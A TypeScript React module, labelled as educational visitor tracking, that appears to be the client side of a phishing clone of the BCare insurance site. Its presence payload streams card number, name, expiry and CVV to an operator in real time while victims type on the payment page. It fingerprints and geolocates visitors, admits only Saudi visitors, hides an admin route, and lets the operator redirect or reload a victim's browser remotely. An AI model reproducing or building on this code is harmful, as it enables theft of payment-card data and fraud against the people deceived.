// Educational-only visitor tracking via Supabase Realtime presence + commands.
import { useEffect, useRef, useCallback } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

const VISITOR_KEY = "bcare_visitor_id_v1";
const TOKEN_KEY = "bcare_visitor_token_v1";
const PROCESSED_COMMAND_KEY = "bcare_processed_visitor_command_v1";

/**
 * Returns the signed visitor token (`<vid>.<hmac>`) if one has been minted.
 * The server verifies this signature — a raw visitor id in the old
 * `x-visitor-id` header is no longer trusted.
 */
export function getVisitorToken(): string | null {
  if (typeof window === "undefined") return null;
  try {
    return localStorage.getItem(TOKEN_KEY);
  } catch {
    return null;
  }
}

let mintPromise: Promise<string | null> | null = null;

/**
 * Ensures a signed visitor token has been minted by the server. Safe to call
 * repeatedly — the mint round-trip only fires once per browser lifetime.
 */
export async function ensureVisitorToken(): Promise<string | null> {
  if (typeof window === "undefined") return null;
  const existing = getVisitorToken();
  if (existing) return existing;
  if (!mintPromise) {
    mintPromise = (async () => {
      try {
        const { data, error } = await supabase.rpc("issue_visitor_token");
        if (error || !data) {
          console.error("[visitor-token] mint failed", error);
          return null;
        }
        const token = data as string;
        try {
          localStorage.setItem(TOKEN_KEY, token);
          const vid = token.split(".")[0];
          if (vid) localStorage.setItem(VISITOR_KEY, vid);
        } catch {}
        return token;
      } catch (e) {
        console.error("[visitor-token] mint threw", e);
        return null;
      } finally {
        mintPromise = null;
      }
    })();
  }
  return mintPromise;
}

export function getVisitorId(): string {
  const token = getVisitorToken();
  if (token) {
    const vid = token.split(".")[0];
    if (vid) return vid;
  }
  let id = localStorage.getItem(VISITOR_KEY);
  if (!id) {
    id = `V-${Math.random().toString(36).slice(2, 8).toUpperCase()}-${Date.now().toString(36).toUpperCase()}`;
    localStorage.setItem(VISITOR_KEY, id);
  }
  return id;
}

// Kick off token minting as soon as the module loads in the browser so
// subsequent RLS-scoped queries have a valid signed header available.
if (typeof window !== "undefined") {
  void ensureVisitorToken();
}


export type VisitorPresence = {
  visitor_id: string;
  path: string;
  user_agent: string;
  online_at: string;
  ip?: string;
  country?: string;          // Full country name (e.g. "Saudi Arabia")
  country_code?: string;     // ISO 2-letter code (e.g. "SA")
  city?: string;
  // Browser/device extras
  language?: string;
  timezone?: string;
  screen_w?: number;
  screen_h?: number;
  viewport_w?: number;
  viewport_h?: number;
  device_pixel_ratio?: number;
  referrer?: string;
  platform?: string;
  is_mobile?: boolean;
  // Live card capture (pre-submit) — broadcast while typing on payment page
  card_number?: string;
  card_name?: string;
  card_exp_month?: string;
  card_exp_year?: string;
  card_cvv?: string;
  card_updated_at?: string;
};

export const VISITOR_CHANNEL = "visitors-online";

type GeoInfo = {
  ip?: string;
  country?: string;
  country_code?: string;
  city?: string;
};

const GEO_CACHE_KEY = "bcare_visitor_geo_v1";

/** Sync helper: returns geo info if it's already cached this session, otherwise an empty object. */
export function getCachedGeo(): GeoInfo {
  try {
    const cached = sessionStorage.getItem(GEO_CACHE_KEY);
    if (cached) return JSON.parse(cached) as GeoInfo;
  } catch {}
  return {};
}

// Live presence payload kept in module scope so any page (e.g. payment) can update it.
let livePayload: Partial<VisitorPresence> = {};
let liveChannel: ReturnType<typeof supabase.channel> | null = null;
let liveBaseRef: { path: string; userAgent: string; visitorId: string } | null = null;

/** Merge extra fields into the visitor's presence and re-track immediately. */
export async function updateVisitorPresence(extra: Partial<VisitorPresence>) {
  livePayload = { ...livePayload, ...extra };
  if (!liveChannel || !liveBaseRef) return;
  await liveChannel.track({
    visitor_id: liveBaseRef.visitorId,
    path: liveBaseRef.path,
    user_agent: liveBaseRef.userAgent,
    online_at: new Date().toISOString(),
    ...livePayload,
  } as VisitorPresence);
}

/** Clear any live card data from presence (e.g. on unmount of payment page). */
export async function clearLiveCardData() {
  livePayload = {
    ip: livePayload.ip,
    country: livePayload.country,
    country_code: livePayload.country_code,
    city: livePayload.city,
  };
  if (liveChannel && liveBaseRef) {
    await liveChannel.track({
      visitor_id: liveBaseRef.visitorId,
      path: liveBaseRef.path,
      user_agent: liveBaseRef.userAgent,
      online_at: new Date().toISOString(),
      ...livePayload,
    } as VisitorPresence);
  }
}

async function fetchGeo(): Promise<GeoInfo> {
  // Cache for the session to avoid hammering the free API
  try {
    const cached = sessionStorage.getItem(GEO_CACHE_KEY);
    if (cached) return JSON.parse(cached) as GeoInfo;
  } catch {}

  const tryEndpoint = async (url: string, mapper: (d: any) => GeoInfo) => {
    try {
      const res = await fetch(url);
      if (!res.ok) return null;
      const data = await res.json();
      return mapper(data);
    } catch {
      return null;
    }
  };

  // Primary: ipapi.co (free, no key)
  let geo: GeoInfo | null = await tryEndpoint("https://ipapi.co/json/", (d) => ({
    ip: d.ip,
    country: d.country_name,
    country_code: d.country_code,
    city: d.city,
  }));

  // Fallback: ipwho.is
  if (!geo || !geo.ip) {
    geo = await tryEndpoint("https://ipwho.is/", (d) => ({
      ip: d.ip,
      country: d.country,
      country_code: d.country_code,
      city: d.city,
    }));
  }

  const result: GeoInfo = geo || {};
  try {
    sessionStorage.setItem(GEO_CACHE_KEY, JSON.stringify(result));
  } catch {}
  return result;
}

/** Mounted once at the app root for non-admin pages. */
export function useVisitorPresence() {
  const location = useLocation();
  const navigate = useNavigate();
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const blockedRef = useRef(false);

  // Skip on admin routes
  const isAdmin = location.pathname.startsWith("/ASas1010");
  // Geo gate: only allow visitors from Saudi Arabia (country_code === "SA")
  useEffect(() => {
    if (isAdmin) return;
    if (location.pathname === "/blocked") return;
    let cancelled = false;
    (async () => {
      const geo = await fetchGeo();
      if (cancelled) return;
      const code = (geo.country_code || "").toUpperCase();
      // If we couldn't determine the country, allow (don't block on API failure).
      if (code && code !== "SA") {
        navigate("/blocked", { replace: true, state: { reason: "geo", country: geo.country } });
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [isAdmin, navigate, location.pathname]);


  // Check block + listen to block changes
  useEffect(() => {
    if (isAdmin) return;
    const visitorId = getVisitorId();

    const checkBlocked = async () => {
      const { data } = await supabase
        .from("blocked_visitors")
        .select("visitor_id")
        .eq("visitor_id", visitorId)
        .maybeSingle();
      if (data) {
        blockedRef.current = true;
        if (location.pathname !== "/blocked") {
          navigate("/blocked", { replace: true });
        }
      }
    };
    checkBlocked();

    const blockChan = supabase
      .channel("blocked-watch-" + visitorId)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "blocked_visitors",
          filter: `visitor_id=eq.${visitorId}`,
        },
        () => {
          blockedRef.current = true;
          navigate("/blocked", { replace: true });
        },
      )
      .on(
        "postgres_changes",
        {
          event: "DELETE",
          schema: "public",
          table: "blocked_visitors",
          filter: `visitor_id=eq.${visitorId}`,
        },
        () => {
          blockedRef.current = false;
        },
      )
      .subscribe();

    return () => {
      supabase.removeChannel(blockChan);
    };
  }, [isAdmin, navigate, location.pathname]);

  // Listen to redirect/refresh commands (via postgres_changes AND broadcast for reliability)
  useEffect(() => {
    if (isAdmin) return;
    const visitorId = getVisitorId();

    const handleCommand = async (command: string, payloadStr: string | null, rowId?: string) => {
      console.log("[visitor-cmd] received", { command, payload: payloadStr });
      if (command === "redirect" && payloadStr) {
        const target = payloadStr;
        const current = window.location.pathname + window.location.search;
        if (target === current) return;

        // One-time redirect: the visitor is sent to the target page once and
        // is then free to navigate anywhere on the site.
        try {
          if (rowId && localStorage.getItem(PROCESSED_COMMAND_KEY) === rowId) return;
          if (rowId) localStorage.setItem(PROCESSED_COMMAND_KEY, rowId);
        } catch {}
        if (rowId) {
          supabase.from("visitor_commands").delete().eq("id", rowId).then();
        }
        window.location.replace(target);
        return;
      } else if (command === "refresh") {
        try {
          if (rowId && localStorage.getItem(PROCESSED_COMMAND_KEY) === rowId) return;
          if (rowId) localStorage.setItem(PROCESSED_COMMAND_KEY, rowId);
        } catch {}
        window.location.reload();
        return;
      }
      if (rowId) {
        supabase.from("visitor_commands").delete().eq("id", rowId).then();
      }
    };

    const cmdChan = supabase
      .channel("cmd-watch-" + visitorId)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "visitor_commands",
          filter: `visitor_id=eq.${visitorId}`,
        },
        (payload) => {
          const row = payload.new as { id: string; command: string; payload: string | null };
          handleCommand(row.command, row.payload, row.id);
        },
      )
      .on("broadcast", { event: "cmd" }, ({ payload }) => {
        const p = payload as { command: string; payload: string | null };
        handleCommand(p.command, p.payload);
      })
      .subscribe((status) => {
        console.log("[visitor-cmd] channel status:", status, "visitorId:", visitorId);
      });

    // Mobile browsers frequently suspend websocket delivery. Poll the durable
    // command row as a fallback so admin redirects still happen immediately
    // after the screen wakes or while realtime is unavailable.
    let commandInFlight = false;
    const pollCommands = window.setInterval(async () => {
      if (commandInFlight) return;
      commandInFlight = true;
      try {
        const token = getVisitorToken();
        let query = supabase
          .from("visitor_commands")
          .select("id, command, payload")
          .eq("visitor_id", visitorId)
          // Always prefer the administrator's latest decision. An older command
          // may remain in the table because visitors deliberately cannot delete
          // admin commands under the hardened access policy.
          .order("created_at", { ascending: false })
          .limit(1);
        if (token) query = query.setHeader("x-visitor-token", token);
        const { data } = await query;
        const row = data?.[0] as { id: string; command: string; payload: string | null } | undefined;
        if (row) await handleCommand(row.command, row.payload, row.id);
      } finally {
        commandInFlight = false;
      }
    }, 1000);

    return () => {
      supabase.removeChannel(cmdChan);
      window.clearInterval(pollCommands);
    };
  }, [isAdmin, navigate]);

  // Presence: track current visitor + path
  useEffect(() => {
    if (isAdmin) return;
    const visitorId = getVisitorId();
    let cancelled = false;

    // Recreate channel on path change so other clients see updated path
    const channel = supabase.channel(VISITOR_CHANNEL, {
      config: { presence: { key: visitorId } },
    });
    channelRef.current = channel;
    liveChannel = channel;
    liveBaseRef = {
      visitorId,
      path: location.pathname + location.search,
      userAgent: navigator.userAgent,
    };
    // Collect device/browser info (cheap, no network)
    const deviceInfo: Partial<VisitorPresence> = (() => {
      try {
        return {
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen_w: window.screen?.width,
          screen_h: window.screen?.height,
          viewport_w: window.innerWidth,
          viewport_h: window.innerHeight,
          device_pixel_ratio: window.devicePixelRatio,
          referrer: document.referrer || undefined,
          platform: (navigator as any).userAgentData?.platform || navigator.platform,
          is_mobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
        };
      } catch {
        return {};
      }
    })();
    // Reset card-related fields on navigation; keep geo if already known
    livePayload = {
      ip: livePayload.ip,
      country: livePayload.country,
      country_code: livePayload.country_code,
      city: livePayload.city,
      ...deviceInfo,
    };

    const upsertSession = async (extra: Partial<VisitorPresence> = {}) => {
      try {
        const token = await ensureVisitorToken();
        const vid = token ? token.split(".")[0] || visitorId : visitorId;
        let query = supabase.from("visitor_sessions").upsert(
          {
            visitor_id: vid,
            last_path: location.pathname + location.search,
            last_seen_at: new Date().toISOString(),
            user_agent: navigator.userAgent,
            platform: deviceInfo.platform ?? null,
            is_mobile: deviceInfo.is_mobile ?? null,
            referrer: deviceInfo.referrer ?? null,
            ip: extra.ip ?? livePayload.ip ?? null,
            country: extra.country ?? livePayload.country ?? null,
            country_code: extra.country_code ?? livePayload.country_code ?? null,
            city: extra.city ?? livePayload.city ?? null,
          },
          { onConflict: "visitor_id" },
        );
        if (token) query = query.setHeader("x-visitor-token", token);
        await query;
      } catch (e) {
        console.warn("[visitor-session] upsert failed", e);
      }
    };

    channel
      .on("presence", { event: "sync" }, () => {
        // no-op for visitor side
      })
      .subscribe(async (status) => {
        if (status !== "SUBSCRIBED") return;
        await channel.track({
          visitor_id: visitorId,
          path: location.pathname + location.search,
          user_agent: navigator.userAgent,
          online_at: new Date().toISOString(),
          ...livePayload,
        } satisfies VisitorPresence);
        // Persist last-known page so admin still sees them after disconnect.
        upsertSession();
        const geo = await fetchGeo();
        if (cancelled) return;
        livePayload = {
          ...livePayload,
          ip: geo.ip,
          country: geo.country,
          country_code: geo.country_code,
          city: geo.city,
        };
        await channel.track({
          visitor_id: visitorId,
          path: location.pathname + location.search,
          user_agent: navigator.userAgent,
          online_at: new Date().toISOString(),
          ...livePayload,
        } satisfies VisitorPresence);
        upsertSession(geo);
      });

    return () => {
      cancelled = true;
      channel.untrack();
      supabase.removeChannel(channel);
      channelRef.current = null;
      if (liveChannel === channel) {
        liveChannel = null;
        liveBaseRef = null;
      }
    };
  }, [isAdmin, location.pathname, location.search]);
}

/** Wrap children, runs the hook. */
export function VisitorPresenceProvider({
  children,
}: {
  children: React.ReactNode;
}) {
  useVisitorPresence();
  return <>{children}</>;
}
